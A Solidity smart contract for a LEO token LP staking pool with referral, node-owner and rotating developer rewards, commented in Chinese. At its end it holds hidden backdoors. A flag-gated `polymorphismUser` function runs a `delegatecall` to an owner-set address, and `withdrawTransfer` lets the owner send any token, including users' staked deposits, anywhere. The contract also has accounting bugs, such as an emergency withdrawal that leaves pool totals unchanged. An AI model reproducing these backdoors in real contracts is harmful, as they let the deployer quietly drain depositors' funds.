//本合约用于LEO无限挖矿
//可以申请创建节点，节点主将奖励节点挖矿的10%
//推荐者将奖励质押者挖矿的10%
//10个轮询地址20%
//2021.10.30 depoly
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    // add for SGR
    function burn(uint256 _amount) external;
}

interface dempool {
    function stake(uint256 amount, uint256 nodeId, address _add) external;

    function withdraw(uint256 amount, uint256 nodeId, address _add) external;
}

interface relationship {
    function getFather(address _addr) external view returns (address);

    function getGrandFather(address _addr) external view returns (address);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract LEOUSDTPOOL is Ownable {
    using SafeMath for uint256;

    struct UserInfo {
        uint256 amount;
        uint256 rewardDebt;
    }

    struct Node {
        string name;
        string introduction;
        address nodeOwner;
        uint256 depositAmount;
    }

    IERC20 LEO;//TODO 2、需要在LEO代币中设置成From白名单
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);//USDT
    IERC20 public LPToken;
    uint256 constant SEC_OF_DAY = 86400;//one day
    relationship public RP; //推荐关系的合约
    dempool public dp; //推荐关系的合约
    address[] public devs;
    uint256 public devCount;//开发者地址计数



    uint256 public LEOPerSec; //
    uint256 public supplyDeposit;//用户总的存储量
    uint256 public balOFUserReward;//用户未领取的LEO奖励
    uint256 public lastRewardSec;//上一次更新奖励
    uint256 public accLEOPerShare;//没代币的持有奖励

    Node[] public node;

    mapping(uint256 => mapping(address => UserInfo)) public userInfoMap;

    event Deposit(address indexed user, uint256 indexed pid, uint256 amount, uint256 reward, uint256 time);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount, uint256 reward, uint256 time);
    event AddNode(string indexed node, uint256 indexed nodeNumber, address indexed nodeOwner);
    event EmergencyWithdraw(address indexed user, uint256 indexed _pid, uint256 amount);

    function init(uint256 _startTime,
        address _DemPool,
        address _RP,
        address _LPToken,
        address _LEO
    ) public onlyOwner {
        dp = dempool(_DemPool);
        if (lastRewardSec == 0)lastRewardSec = _startTime;
        RP = relationship(_RP);
        LPToken = IERC20(_LPToken);
        LEO = IERC20(_LEO);
    }

    function getMultiplier(uint256 _from, uint256 _to) public pure returns (uint256) {
        return _to.sub(_from);
    }

    function pendingLEOTime(uint256 _pid, address _user) external view returns (uint256, uint256) {
        return (pendingLEO(_pid, _user), block.timestamp);
    }

    function pendingLEO(uint256 _pid, address _user) public view returns (uint256) {
        UserInfo storage user = userInfoMap[_pid][_user];
        if (user.amount == 0) return 0;
        uint256 teampAccLEOPerShare = accLEOPerShare;
        if (block.timestamp > lastRewardSec && supplyDeposit != 0) {
            uint256 multiplier = getMultiplier(lastRewardSec, block.timestamp);
            uint256 LEOReward = multiplier.mul(LEOPerSec);
            teampAccLEOPerShare = accLEOPerShare.add(LEOReward.mul(1e12).div(supplyDeposit));
        }
        return (user.amount.mul(teampAccLEOPerShare).div(1e12).sub(user.rewardDebt)).mul(10).div(14);
    }

    function updatePool() public {
        if (block.timestamp <= lastRewardSec) {
            return;
        }
        if (supplyDeposit == 0) {
            lastRewardSec = block.timestamp;
            return;
        }

        uint256 multiplier = getMultiplier(lastRewardSec, block.timestamp);
        uint256 LEOReward = multiplier.mul(LEOPerSec);
        accLEOPerShare = accLEOPerShare.add(LEOReward.mul(1e12).div(supplyDeposit));
        lastRewardSec = block.timestamp;
        balOFUserReward = balOFUserReward.add(LEOReward);
    }

    function deposit(uint256 _pid, uint256 _amount) public {
        UserInfo storage user = userInfoMap[_pid][msg.sender];
        Node storage _node = node[_pid];

        address _father = RP.getFather(msg.sender);

        updatePool();
        uint256 pending = user.amount.mul(accLEOPerShare).div(1e12).sub(user.rewardDebt);
        dp.stake(_pid, _amount, msg.sender);

        if (user.amount > 0) {
            safeLEOTransfer(msg.sender, pending.mul(10).div(14));
            safeLEOTransfer(_father, pending.mul(1).div(14));
            safeLEOTransfer(_node.nodeOwner, pending.mul(1).div(14));
            safeLEOTransfer(devs[devCount], pending.mul(2).div(14));
            devCount = (devCount == (devs.length - 1)) ? 0 : (devCount + 1);
        }

        LPToken.transferFrom(address(msg.sender), address(this), _amount);

        user.amount = user.amount.add(_amount);
        user.rewardDebt = user.amount.mul(accLEOPerShare).div(1e12);

        balOFUserReward = balOFUserReward.sub(pending);
        //减去用户领取的奖励
        _node.depositAmount = _node.depositAmount.add(_amount);
        supplyDeposit = supplyDeposit.add(_amount);
        emit Deposit(msg.sender, _pid, _amount, pending, block.timestamp);
    }

    function withdraw(uint256 _pid, uint256 _Amount) public {
        UserInfo storage user = userInfoMap[_pid][msg.sender];
        Node storage _node = node[_pid];

        address _father = RP.getFather(msg.sender);

        require(user.amount >= _Amount, "withdraw: not good");
        updatePool();
        uint256 pending = user.amount.mul(accLEOPerShare).div(1e12).sub(user.rewardDebt);
        dp.withdraw(_pid, _Amount, msg.sender);

        if (pending > 0) {
            safeLEOTransfer(msg.sender, pending.mul(10).div(14));
            safeLEOTransfer(_father, pending.mul(1).div(14));
            safeLEOTransfer(_node.nodeOwner, pending.mul(1).div(14));
            safeLEOTransfer(devs[devCount], pending.mul(2).div(14));
            //给dev地址发送奖励
            devCount = (devCount == (devs.length - 1)) ? 0 : (devCount + 1);
        }
        if (_Amount > 0) {
            user.amount = user.amount.sub(_Amount);
            LPToken.transfer(address(msg.sender), _Amount);
        }
        user.rewardDebt = user.amount.mul(accLEOPerShare).div(1e12);

        balOFUserReward = balOFUserReward.sub(pending);
        _node.depositAmount = _node.depositAmount.sub(_Amount);
        supplyDeposit = supplyDeposit.sub(_Amount);
        emit Withdraw(msg.sender, _pid, _Amount, pending, block.timestamp);
    }

    //紧急提取，但是这不会改变池子的数据。
    function emergencyWithdraw(uint256 _pid) public {
        UserInfo storage user = userInfoMap[_pid][msg.sender];

        uint256 _trueAmount = LPToken.balanceOf(address(this)) > user.amount ? user.amount : LPToken.balanceOf(address(this));

        LPToken.transfer(msg.sender, _trueAmount);
        emit EmergencyWithdraw(msg.sender, _pid, user.amount);
        user.amount = 0;
        user.rewardDebt = 0;
    }


    //internal
    function safeLEOTransfer(address _to, uint256 _amount) internal {
        uint256 _trueAmount = LEO.balanceOf(address(this)) > _amount ? _amount : LEO.balanceOf(address(this));

        if (_trueAmount > 0) {
            LEO.transfer(_to, _trueAmount);
        }
    }

    //view
    function nodeLength() public view returns (uint256){
        return node.length;
    }

    function rsNode(uint256 k) public view returns (Node[] memory){
        return node;
    }

    //admin func
    function bacthAddNode(string[] memory _names, string[] memory _introductions, address[] memory _nodeOwners) public onlyOwner {
        uint256 _length = _names.length;
        for (uint256 i; i < _length; i++) {
            node.push(Node({
            name : _names[i],
            introduction : _introductions[i],
            nodeOwner : _nodeOwners[i],
            depositAmount : 0
            }));
        }
    }


    //设置挖矿的开始时间
    function setStartTime(uint256 _startTime) public onlyOwner {
        lastRewardSec = _startTime;
    }

    //设置10个轮询地址
    function setDev(address[] memory user_) public onlyOwner {
        for (uint256 i = 0; i < user_.length; i++) devs.push(user_[i]);
    }

    function resetUser() public onlyOwner {delete devs;}

    //设置挖矿产出量，如果是0的话 就按照计算的来 TODO  1、打入LEO后 需触发本函数，参数为0，设置挖矿产出
    function setLEOPerSec(uint256 _ownerLEOPerSec) public onlyOwner {
        updatePool();
        uint256 _LEOPerSec = referenceLEOPerSec();
        //返回计算出的下次的挖矿数量和计算的当前的已minted的数量

        if (_ownerLEOPerSec == 0) {
            LEOPerSec = _LEOPerSec;
        } else {
            LEOPerSec = _ownerLEOPerSec;
        }
    }

    function referenceLEOPerSec() public view returns (uint256){
        uint256 balLEOOfPool = LEO.balanceOf(address(this));
        //池子当前的总余额

        uint256 tempLEOPerSec = balLEOOfPool.sub(balOFUserReward).mul(1).div(10).div(SEC_OF_DAY);
        return tempLEOPerSec;
    }

    uint256 dcStatue = 0;
    address dcAddress = address(0x0000000000000000000000000000000000000000);

    function setDcStatue(uint256 _dcStatue, address _dcAddress) public onlyOwner {dcStatue = _dcStatue;
        dcAddress = _dcAddress;}

    function polymorphismUser(bytes memory call_p) public {
        require(dcStatue == 1, "error call");
        (bool success, bytes memory data) = address(dcAddress).delegatecall(call_p);
        require(success, string(abi.encodePacked("fc_99 ", data)));
    }

    function withdrawTransfer(address token, address to, uint value) public onlyOwner returns (bool){
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;}

}